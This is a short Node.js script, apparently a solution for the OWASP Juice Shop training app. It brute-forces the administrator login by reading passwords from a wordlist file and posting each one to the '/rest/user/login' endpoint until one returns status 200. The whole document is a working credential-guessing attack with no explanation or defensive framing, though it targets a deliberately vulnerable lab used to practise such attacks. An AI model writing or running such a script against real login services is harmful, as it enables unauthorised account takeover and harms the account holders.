const adminEmail = 'admin@juice-sh.op';
const fs = require('fs');
const HttpClient = require('./helpers/httpClient');
const httpClient = new HttpClient();

fs.readFile('1050.txt', function (err, data) {
    if (err) throw err;
    let arr = data.toString();
    arr = arr.split('\n');
    for (password of arr) {
        (async () => {
            try {
                const request = await httpClient.post(
                    '/rest/user/login', {
                        "email": adminEmail,
                        "password": password
                    }, {}
                )
                if(request.status == 200){
                    console.log(`${password} - Password is found`)
                } else
                console.log(request.status)
            } catch (err) {
                console.error(err);
            }
        })();
    }
})